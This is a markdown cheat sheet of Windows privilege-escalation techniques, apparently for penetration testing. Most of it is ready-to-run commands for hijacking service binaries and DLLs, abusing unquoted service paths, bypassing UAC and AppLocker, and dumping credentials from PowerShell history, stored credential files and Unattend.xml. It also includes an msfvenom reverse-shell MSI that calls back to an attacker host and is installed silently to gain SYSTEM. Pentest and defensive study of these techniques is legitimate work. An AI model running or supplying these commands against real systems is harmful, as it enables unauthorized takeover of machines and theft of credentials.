## Service-based Privilege Escalation

### Service Binary Hijacking
> Replace a service binary with a malicious one when permissions allow

```powershell
# Check service binaries and permissions
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls "C:\path\to\service.exe"

# Create a malicious service binary
# Compile with: x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

# Replace the binary and restart service
move C:\path\to\service.exe service.exe.bak
move adduser.exe C:\path\to\service.exe
net stop [service_name]
net start [service_name]
# If you can't restart, check if auto-start: shutdown /r /t 0
```

### Unquoted Service Paths
> Services with unquoted paths can be exploited with space traversal

```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Create a malicious executable in the path
# Example for path: C:\Program Files\Vulnerable Service\service.exe
# Place malicious binary at: C:\Program Files\Vulnerable.exe
```

### DLL Hijacking
> Replace or add DLLs that are loaded by a service

```powershell
# Find potential DLL hijacking
Process Monitor - filter for "NAME NOT FOUND" and "PATH ENDING .dll"

# Create malicious DLL
# Compile with: x86_64-w64-mingw32-gcc -shared -o hijackme.dll dll_hijack.c

# Place in the correct location and restart service
```

##  UAC Bypass Techniques

### Standard UAC Bypass
> Bypass User Account Control to get elevated privileges

```powershell
# Check current UAC settings
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

# Check Windows build
[environment]::OSVersion.Version

# Use appropriate bypass technique (example using DLL hijacking)
# For Windows 10 build 14393
# 1. Create malicious DLL
# 2. Place in WindowsApps folder
# 3. Execute with trusted binary that auto-elevates
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

## AlwaysInstallElevated

> If enabled, MSI files can be installed with SYSTEM privileges

```powershell
# Check if enabled (both must be set to 1)
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker-ip LPORT=4444 -f msi -o malicious.msi

# Generate MSI with PowerUp
Import-Module .\PowerUp.ps1
Write-UserAddMSI

# Install MSI to get SYSTEM
msiexec /quiet /qn /i malicious.msi
```

## Credential Theft
> Various methods to extract credentials from Windows systems

```powershell
# Find passwords in files
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

# PowerShell history
gc (Get-PSReadLineOption).HistorySavePath
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

# Stored PowerShell credentials
$credential = Import-Clixml -Path 'C:\path\to\credential.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password

# Unattended installation files
gc C:\Windows\Panther\Unattend.xml
gc C:\Windows\Panther\Unattend\Unattend.xml
gc C:\Windows\System32\sysprep\Unattend.xml

# More techniques coming soon...
```

## Restricted Environments

> Techniques for escaping restricted environments like Citrix, RDP restricted, AppLocker

```powershell
# Bypassing AppLocker
# Check current policy
Get-AppLockerPolicy -Effective | Format-List

# Use alternate execution methods:
# - Regsvr32: regsvr32.exe /s /u /i:test.sct scrobj.dll
# - MSBuild: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj
# - InstallUtil: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# More techniques coming soon...
```

## Additional Techniques

> Additional privilege escalation techniques

```powershell
# Scheduled Tasks
schtasks /query /fo LIST /v

# Registry autoruns
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Insecure GUI apps
# Look for apps running as SYSTEM that may have exploitable features

# More techniques coming soon...
```

## Dealing with End of Life Systems

> Targeting outdated systems that are no longer receiving security updates

```powershell
# Identify EOL systems
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Common EOL systems:
# - Windows XP/2003: MS17-010 (EternalBlue)
# - Windows 7/2008 R2: Multiple known vulnerabilities
# - Windows 8/2012: Multiple known vulnerabilities

# More techniques coming soon...
```